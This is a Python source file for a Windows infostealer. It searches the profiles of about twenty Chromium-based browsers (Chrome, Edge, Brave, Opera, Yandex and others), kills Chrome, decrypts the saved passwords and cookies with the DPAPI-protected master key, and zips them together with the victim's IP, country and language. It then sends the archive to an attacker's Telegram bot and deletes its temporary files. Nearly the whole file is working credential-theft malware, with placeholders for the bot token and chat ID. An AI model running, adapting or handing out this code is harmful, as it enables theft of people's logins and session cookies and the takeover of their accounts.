import asyncio
import os
import shutil
import smtplib
import subprocess
from aiogram import Bot
from datetime import datetime
import requests
import locale
import json
import base64
import sqlite3
from Cryptodome.Cipher import AES
import win32crypt
import os
import shutil
import sys
import getpass

import tempfile

path_data = tempfile.mktemp(prefix="temp")
# print(path_data)
os.mkdir(path_data)
passwd = 0
cookies = 0
grabfiles = 0


def remove_directory(directory_path):
    try:
        shutil.rmtree(directory_path)
    except OSError as e:
        pass


try:
    os.mkdir(path_data + "\\GrabFiles")
except:
    pass


def check_chrome_running():
    for proc in os.popen("tasklist").readlines():
        if "chrome.exe" in proc:
            subprocess.run("taskkill /f /im chrome.exe", shell=True)


def find_profile(data_path):
    profile = []
    profile.append("Default")
    try:
        objects = os.listdir(data_path)
        files_dir = [f for f in objects if os.path.isdir(os.path.join(data_path, f))]
        for folder in files_dir:
            text = folder.split()
            if text[0] == "Profile":
                profile.append(folder)
        return profile
    except:
        pass


def pcinfo():
    try:
        ip = requests.get("https://api.ipify.org").text
    except Exception as e:
        ip = None

    try:
        system_locale, _ = locale.getlocale()
        language = system_locale if system_locale else "en-US"
    except Exception as e:
        language = None

    return ip, language


def get_country(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        data = response.json()
        country = data.get("country", "N/A")
        return country
    except Exception as e:
        return "N/A"


def browser():
    a = [
        {
            "name": "Google",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Google",
                "Chrome",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Google",
                    "Chrome",
                    "User Data",
                )
            ),
        },
        {
            "name": "CocCoc",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "CocCoc",
                "Browser",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "CocCoc",
                    "Browser",
                    "User Data",
                )
            ),
        },
        {
            "name": "Edge",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Microsoft",
                "Edge",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Microsoft",
                    "Edge",
                    "User Data",
                )
            ),
        },
        {
            "name": "Brave",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "BraveSoftware",
                "Brave-Browser",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                )
            ),
        },
        {
            "name": "Chromium",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Chromium",
                    "User Data",
                )
            ),
        },
        {
            "name": "Amigo",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"
                )
            ),
        },
        {
            "name": "Torch",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"
                )
            ),
        },
        {
            "name": "Kometa",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"
                )
            ),
        },
        {
            "name": "Orbitum",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Orbitum",
                    "User Data",
                )
            ),
        },
        {
            "name": "CentBrowser",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "CentBrowser",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "CentBrowser",
                    "User Data",
                )
            ),
        },
        {
            "name": "7Star",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "7Star",
                "7Star",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "7Star",
                    "7Star",
                    "User Data",
                )
            ),
        },
        {
            "name": "Sputnik",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Sputnik",
                "Sputnik",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Sputnik",
                    "Sputnik",
                    "User Data",
                )
            ),
        },
        {
            "name": "Vivaldi",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Vivaldi",
                    "User Data",
                )
            ),
        },
        {
            "name": "GoogleChromeSxS",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Google",
                "Chrome SxS",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Google",
                    "Chrome SxS",
                    "User Data",
                )
            ),
        },
        {
            "name": "EpicPrivacyBrowser",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Epic Privacy Browser",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Epic Privacy Browser",
                    "User Data",
                )
            ),
        },
        {
            "name": "MicrosoftEdge",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Microsoft",
                "Edge",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Microsoft",
                    "Edge",
                    "User Data",
                )
            ),
        },
        {
            "name": "Uran",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "uCozMedia",
                "Uran",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "uCozMedia",
                    "Uran",
                    "User Data",
                )
            ),
        },
        {
            "name": "Yandex",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Yandex",
                "YandexBrowser",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Yandex",
                    "YandexBrowser",
                    "User Data",
                )
            ),
        },
        {
            "name": "Brave",
            "path": os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "BraveSoftware",
                "Brave-Browser",
                "User Data",
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                )
            ),
        },
        {
            "name": "Iridium",
            "path": os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"
            ),
            "profile": find_profile(
                os.path.join(
                    os.environ["USERPROFILE"],
                    "AppData",
                    "Local",
                    "Iridium",
                    "User Data",
                )
            ),
        },
        {
            "name": "Opera",
            "path": os.path.join(
                os.environ["APPDATA"], "Opera Software", "Opera Stable"
            ),
            "profile": find_profile(
                os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
            ),
        },
        {
            "name": "OperaGX",
            "path": os.path.join(
                os.environ["APPDATA"], "Opera Software", "Opera GX Stable"
            ),
            "profile": find_profile(
                os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
            ),
        },
    ]

    return a


def getSecretKey(path1):
    try:
        path = os.path.normpath(path1 + "\\Local State")
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        pass


# Decrypt
def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)


def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except:
        pass


def start1():
    bc = browser()
    cookie = []
    for bs in bc:
        if os.path.exists(bs["path"]):
            for profile in bs["profile"]:
                try:
                    if os.path.exists(
                        os.path.join(bs["path"], profile, "Network", "Cookies")
                    ):
                        shutil.copyfile(
                            os.path.join(bs["path"], profile, "Network", "Cookies"),
                            os.path.join(path_data, bs["name"] + " " + profile),
                        )
                        cookie.append(
                            {
                                "path": os.path.join(
                                    path_data, bs["name"] + " " + profile
                                ),
                                "pathkey": bs["path"],
                                "name": bs["name"],
                                "profile": profile,
                            }
                        )
                except:
                    pass
        else:
            pass
    return cookie


def start2():
    bc = browser()
    password = []
    for bs in bc:
        if os.path.exists(bs["path"]):
            for profile in bs["profile"]:
                try:
                    if os.path.exists(os.path.join(bs["path"], profile, "Login Data")):
                        shutil.copyfile(
                            os.path.join(bs["path"], profile, "Login Data"),
                            os.path.join(path_data, bs["name"] + " " + profile),
                        )
                        password.append(
                            {
                                "path": os.path.join(
                                    path_data, bs["name"] + " " + profile
                                ),
                                "pathkey": bs["path"],
                                "name": bs["name"],
                                "profile": profile,
                            }
                        )
                except:
                    pass
        else:
            pass
    return password




def extract():
    global cookies, passwd
    datacookie = start1()
    for row in datacookie:
        try:
            c = sqlite3.connect(row["path"])
            cursor = c.cursor()
            select_statement = "SELECT host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc FROM cookies"
            cursor.execute(select_statement)
            bc = cursor.fetchall()
            data1 = []
            for user in bc:
                if user[4] == 1:
                    httponly = "TRUE"
                else:
                    httponly = "FALSE"
                if user[5] == 1:
                    secure = "TRUE"
                else:
                    secure = "FALSE"
                value = decryptPassword(user[3], getSecretKey(row["pathkey"]))
                cookie_data = (
                    f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"
                )
                # print(cookie_data)
                data1.append(cookie_data)
                cookies += 1

                url_filename = f"cookie__{user[0].replace('/', '_')}.txt"
                url_filepath = os.path.join(
                    path_data, row["name"], row["profile"], url_filename
                )

                os.makedirs(os.path.dirname(url_filepath), exist_ok=True)

                with open(url_filepath, "a", encoding="utf-8") as url_file:
                    url_file.write(cookie_data)
        except Exception as e:
            # print(f"Error extracting cookies for {row['name']} - {row['profile']}: {e}")
            pass

    datapassword = start2()
    for row in datapassword:
        try:
            c = sqlite3.connect(row["path"])
            cursor = c.cursor()
            select_statement = (
                "SELECT action_url, username_value, password_value FROM logins"
            )
            cursor.execute(select_statement)
            login_data = cursor.fetchall()
            data2 = []
            for userdatacombo in login_data:
                if (
                    userdatacombo[1] != None
                    and userdatacombo[2] != None
                    and userdatacombo[1] != ""
                    and userdatacombo[2] != ""
                    and userdatacombo[0] != ""
                ):
                    password = decryptPassword(
                        userdatacombo[2], getSecretKey(row["pathkey"])
                    )
                    data = f"**************************************************\nURL: {userdatacombo[0]}\nUsername: {userdatacombo[1]}\nPassword: {password}"
                    data2.append(data)
                    passwd += 1

            url_filepath = os.path.join(
                path_data, row["name"], row["profile"], "passwords.txt"
            )
            os.makedirs(os.path.dirname(url_filepath), exist_ok=True)

            with open(os.path.join(url_filepath), "w", encoding="utf-8") as f:
                for line in data2:
                    f.write(line + "\n")

        except Exception as e:
            # print(f"Error extracting passwords for {row['name']} - {row['profile']}: {e}")
            pass


def sendfile(TOKEN, chat_id, path, caption):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        params = {"chat_id": chat_id, "caption": caption}

        files = {"document": open(path, "rb")}
        response = requests.post(url, params=params, files=files)

        if response.status_code != 200:
            # print(f"Error sending file. Response: {response.text}")
            pass
    except Exception as e:
        # print(f"Error sending file: {e}")
        pass


name_f = ""


async def main():

    ip, language = pcinfo()
    country = get_country(ip)

    check_chrome_running()
    extract()

    current_time = datetime.now().strftime("%Hh%Mm%Ss-%d-%m-%Y")
    name_f = f"{country}_{ip}_{current_time}"
    z_ph = os.path.join(os.environ["TEMP"], name_f + ".zip")
    shutil.make_archive(z_ph[:-4], "zip", path_data)
    TOKEN = <Token telegram here>
    ID = "id here"
    body = f"==== @CyberCrlm3 ====\n⏰ Date => {datetime.now().strftime('%m/%d/%Y %H:%M')}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n📝 Language => {language}\n====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
    await sendfile(TOKEN, ID, z_ph, body)
    shutil.rmtree(os.environ["TEMP"], name_f + ".zip")
    shutil.rmtree(os.environ["TEMP"], name_f)
    try:
        shutil.rmtree(path_data)
    except:
        try:
            os.system(f"rmdir {path_data}")
        except:
            pass

    await sendfile(TOKEN, ID, z_ph, body)


if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
    except:
        pass
    try:
        remove_directory(path_data)
    except:
        pass
